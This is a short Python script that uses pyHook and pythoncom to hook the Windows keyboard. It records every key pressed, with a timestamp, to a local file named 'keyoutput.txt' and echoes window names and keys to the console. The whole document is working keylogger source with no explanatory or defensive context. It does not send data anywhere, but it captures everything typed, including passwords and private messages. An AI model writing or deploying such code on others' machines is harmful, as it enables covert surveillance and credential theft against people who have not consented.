import pyHook, pythoncom, sys, logging

file_log = 'keyoutput.txt'

def OnKeyboardEvent(event):
  logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(asctime)s - %(message)s')
  print('WindowName:', event.WindowName)
  print('Window:', event.Window)
  print('Key:', event.Key)
  logging.log(10, event.Key)
  return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()